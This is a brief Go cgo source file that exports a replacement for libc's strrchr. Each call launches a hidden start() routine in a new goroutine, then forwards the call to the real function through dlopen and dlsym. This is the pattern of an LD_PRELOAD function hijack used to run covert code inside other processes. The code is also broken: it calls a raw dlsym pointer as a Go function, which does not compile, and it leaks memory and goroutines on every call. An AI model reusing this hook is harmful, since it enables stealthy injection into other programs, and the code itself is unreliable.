package main

// #cgo LDFLAGS: -ldl
// #include <dlfcn.h>
import "C"

//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
	go start()
	handle := C.dlopen(C.CString("libc.so"), C.RTLD_LAZY)
	old_strrchr := C.dlsym(handle, C.CString("strrchr"))
	return old_strrchr(s, c)
}
